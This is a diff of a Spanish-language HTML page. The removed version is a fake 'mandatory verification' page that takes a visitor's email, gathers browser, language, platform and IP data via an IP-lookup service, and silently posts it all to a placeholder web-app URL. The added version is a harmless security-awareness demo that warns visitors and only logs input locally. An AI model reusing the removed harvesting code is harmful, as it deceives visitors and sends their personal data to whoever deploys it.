@@ -1,80 +1,73 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <title>Verificación</title>
-  <style>
-    body {
-      background: #111;
-      color: #fff;
-      font-family: Roboto, sans-serif;
-      text-align: center;
-      padding-top: 100px;
-    }
-    button {
-      background: #00ffcc;
-      color: #000;
-      padding: 15px 30px;
-      border: none;
-      border-radius: 10px;
-      font-size: 1.2em;
-      cursor: pointer;
-    }
-    input {
-      padding: 10px;
-      border-radius: 5px;
-      border: none;
-      margin-top: 10px;
-      width: 250px;
-      font-size: 1em;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Práctica de Seguridad</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 300px;
+        }
+        h1 {
+            color: #2c3e50;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        button {
+            background-color: #3498db;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #2980b9;
+        }
+    </style>
 </head>
 <body>
-  <h1>Verificación obligatoria</h1>
-  <p>Ingresa tu correo electrónico para continuar</p>
-  <input type="email" id="correo" placeholder="tucorreo@ejemplo.com" required>
-  <br><br>
-  <button onclick="enviarDatos()">Continuar</button>
+    <div class="container">
+        <h1>¡Bienvenido! 👋</h1>
+        <p>Por favor, ingresa tus datos para continuar:</p>
+        <input type="text" id="nombre" placeholder="Tu nombre completo" required>
+        <input type="email" id="correo" placeholder="tu@correo.com" required>
+        <button onclick="guardarDatos()">Enviar</button>
+        <p id="mensaje"></p>
+    </div>
 
-  <script>
-    function enviarDatos() {
-      const correo = document.getElementById("correo").value.trim();
-      if (!correo) {
-        alert("Por favor ingresa tu correo electrónico.");
-        return;
-      }
+    <script>
+        function guardarDatos() {
+            const nombre = document.getElementById("nombre").value;
+            const correo = document.getElementById("correo").value;
 
-      const url = "AQUÍ_VA_TU_URL_WEB_APP"; // ← Pegá aquí tu URL del Web App
-
-      const navegador = navigator.userAgent;
-      const idioma = navigator.language || navigator.userLanguage;
-      const so = navigator.platform;
-
-      fetch("https://api.ipify.org?format=json")
-        .then(response => response.json())
-        .then(data => {
-          const ip = data.ip;
-
-          const formData = new URLSearchParams({
-            correo,
-            navegador,
-            so,
-            idioma,
-            ip
-          });
-
-          fetch(url, {
-            method: 'POST',
-            mode: 'no-cors',
-            headers: { "Content-Type": "application/x-www-form-urlencoded" },
-            body: formData
-          });
-
-          alert("Verificado. Gracias.");
-        });
-    }
-  </script>
+            if (nombre && correo) {
+                document.getElementById("mensaje").innerHTML = 
+                    `¡Gracias, ${nombre}!<br>Esta es una práctica de seguridad. Nunca compartas datos sensibles en páginas no verificadas.`;
+                console.log("Datos capturados (solo práctica):", { nombre, correo });
+            } else {
+                alert("¡Oops! Completa ambos campos.");
+            }
+        }
+    </script>
 </body>
 </html>
-
